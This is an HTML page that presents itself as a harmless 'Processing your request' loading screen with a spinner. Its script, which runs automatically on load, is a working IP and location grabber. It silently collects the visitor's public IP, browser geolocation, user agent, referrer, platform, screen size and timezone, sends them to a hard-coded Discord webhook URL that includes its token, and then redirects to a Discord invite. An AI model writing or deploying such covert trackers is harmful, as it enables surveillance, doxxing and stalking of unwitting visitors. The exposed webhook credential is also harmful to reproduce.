<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing Request...</title>
    <style>
        body {
            background-color: #1a1a1a; /* Dark background */
            color: #f0f0f0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column; /* Align items vertically */
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.5s linear infinite; /* Slower spin */
            margin-bottom: 20px; /* Space between spinner and text */
        }

        /* Rainbow Spinner Effect */
        @keyframes spin {
            0% { transform: rotate(0deg); border-top-color: #FF0000; }    /* Red */
            14% { border-top-color: #FF7F00; }  /* Orange */
            28% { border-top-color: #FFFF00; }  /* Yellow */
            42% { border-top-color: #00FF00; }  /* Green */
            57% { border-top-color: #0000FF; }  /* Blue */
            71% { border-top-color: #4B0082; }  /* Indigo */
            85% { border-top-color: #9400D3; }  /* Violet */
            100% { transform: rotate(360deg); border-top-color: #FF0000; } /* Back to Red */
        }

        .message {
            font-size: 1.2em;
            color: #ccc;
        }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <div class="message">Processing your request... Please wait.</div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX';
        const REDIRECT_URL = 'https://discord.gg/techhaus';

        // Function to send data to Discord Webhook
        async function sendDataToWebhook(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        // Using embeds for a cleaner Discord message format
                        embeds: [{
                            title: 'User Access Log',
                            color: 16711680, // A fixed, distinct color for the embed (e.g., Red)
                            fields: [
                                { name: 'IP Address', value: data.ip || 'N/A', inline: true },
                                // Conditionally add geolocation fields if available
                                ...(data.latitude && data.longitude ? [
                                    { name: 'Latitude', value: String(data.latitude), inline: true },
                                    { name: 'Longitude', value: String(data.longitude), inline: true }
                                ] : []),
                                { name: 'User Agent', value: data.userAgent || 'N/A', inline: false }, // Use full width for User Agent
                                { name: 'Referrer', value: data.referrer || 'N/A', inline: false },
                                { name: 'Language', value: data.language || 'N/A', inline: true },
                                { name: 'Platform', value: data.platform || 'N/A', inline: true },
                                { name: 'Screen Resolution', value: data.screenResolution || 'N/A', inline: true },
                                { name: 'Timezone', value: data.timezone || 'N/A', inline: true },
                                { name: 'Timestamp (UTC)', value: data.timestampUTC || 'N/A', inline: false }
                            ],
                            footer: {
                                text: 'Automated Log by Instant Redirect'
                            },
                            timestamp: new Date().toISOString() // ISO 8601 format for Discord timestamp
                        }]
                    }),
                    mode: 'cors', // Essential for cross-origin requests to webhooks
                    // Use 'keepalive' to attempt to send the request even after the page navigates away,
                    // though browser support can vary and it's not a guaranteed delivery.
                    keepalive: true
                });
                console.log('Webhook data transmission initiated.');
            } catch (error) {
                console.error('Failed to initiate webhook transmission:', error);
            }
        }

        // Function to reliably get public IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' }); // No caching
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return null;
            }
        }

        // Function to attempt geolocation with a timeout
        function getGeolocationWithTimeout(timeoutMs) {
            return new Promise((resolve) => {
                if ("geolocation" in navigator) {
                    const geoTimeout = setTimeout(() => {
                        console.warn('Geolocation attempt timed out.');
                        resolve({ latitude: null, longitude: null, error: 'Timed out' });
                    }, timeoutMs);

                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            clearTimeout(geoTimeout);
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            });
                        },
                        (error) => {
                            clearTimeout(geoTimeout);
                            console.warn('Geolocation permission denied or error:', error.message);
                            resolve({ latitude: null, longitude: null, error: error.message });
                        },
                        {
                            enableHighAccuracy: false, // Prefer speed over high accuracy for this purpose
                            timeout: timeoutMs,        // Match the promise timeout
                            maximumAge: 0              // Do not use cached positions
                        }
                    );
                } else {
                    console.warn("Geolocation API not supported by this browser.");
                    resolve({ latitude: null, longitude: null, error: 'Not supported' });
                }
            });
        }

        // Main initialization function
        async function initializePageAndRedirect() {
            const collectedData = {};

            // Collect essential browser information synchronously
            collectedData.userAgent = navigator.userAgent;
            collectedData.referrer = document.referrer;
            collectedData.language = navigator.language;
            collectedData.platform = navigator.platform;
            collectedData.screenResolution = `${window.screen.width}x${window.screen.height}`;
            collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            collectedData.timestampUTC = new Date().toUTCString();

            // Asynchronously fetch IP and geolocation in parallel to minimize delay
            const ipPromise = getIPAddress();
            const geoPromise = getGeolocationWithTimeout(1500); // 1.5 second timeout for geolocation

            const [ip, geoResult] = await Promise.all([ipPromise, geoPromise]);

            collectedData.ip = ip;
            if (geoResult.latitude && geoResult.longitude) {
                collectedData.latitude = geoResult.latitude;
                collectedData.longitude = geoResult.longitude;
            }

            // Immediately attempt to send data to webhook without awaiting its full completion.
            // This is a fire-and-forget for speed.
            sendDataToWebhook(collectedData);

            // Redirect the user after a minimal delay to allow the webhook request to start.
            // This ensures an "instant" feel while still attempting data transmission.
            setTimeout(() => {
                window.location.replace(REDIRECT_URL);
            }, 750); // 750ms delay
        }

        // Execute on page load
        document.addEventListener('DOMContentLoaded', initializePageAndRedirect);
    </script>
</body>
</html>
